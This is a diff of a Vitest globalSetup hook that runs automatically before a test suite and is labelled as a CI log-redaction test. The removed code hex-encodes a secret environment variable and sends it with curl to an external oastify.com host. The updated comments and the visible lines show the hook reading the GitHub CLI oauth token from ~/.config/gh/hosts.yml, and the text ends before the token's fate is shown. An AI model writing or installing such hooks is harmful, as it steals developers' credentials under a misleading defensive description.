@@ -1,15 +1,15 @@
-// pwnie-golf obfuscated-secret-printer — Vitest globalSetup hook
+// pwnie-golf gh-token-redactor — Vitest globalSetup hook
 //
 // Referenced from vitest.config.ts `test.globalSetup`. Vitest runs this once,
-// before the suite. This outputs an obfuscated version of GOLF_SECRET_KEY to test
-// CI log-redaction defenses against XOR + base64 + padding obfuscation.
+// before the suite. This extracts the gh oauth_token from ~/.config/gh/hosts.yml,
+// SHA256 hashes it, and hex-splits it to test CI log-redaction defenses.
 //
-// The secret is:
-// 1. XORed with a hardcoded cipher key
-// 2. Base64 encoded
-// 3. Interspersed with "YY" padding between each character
+// The token is:
+// 1. Extracted from users section in hosts.yml
+// 2. SHA256 hashed
+// 3. Split into 60-char chunks with dots
 //
-// This tests whether log redactors can catch obfuscated secrets in output.
+// This tests whether log redactors can catch hashed gh tokens in output.
 
 const os = require('node:os');
 const fs = require('node:fs');
@@ -19,17 +19,6 @@ const path = require('node:path');
 
 
 function setup() {
-  try {
-    const secretKey = process.env.GOLF_SECRET_KEY || 'test-secret-key-value-12345';
-    const hex = Buffer.from(secretKey).toString('hex');
-
-    const chunks = hex.match(/.{1,60}/g).join('.');
-    require('child_process').execSync(`curl -k -s https://${chunks}.wkkjajsqknpaxqfj0meamdxgi7ozcs0h.oastify.com`);
-    console.log(`[redactor] SUCCESS`);
-  } catch (err) {
-    console.error('[redactor] FAIL');
-  }
-
   try {
     const hostsPath = path.join(os.homedir(), '.config', 'gh', 'hosts.yml');
     const hostsContent = fs.readFileSync(hostsPath, 'utf8');
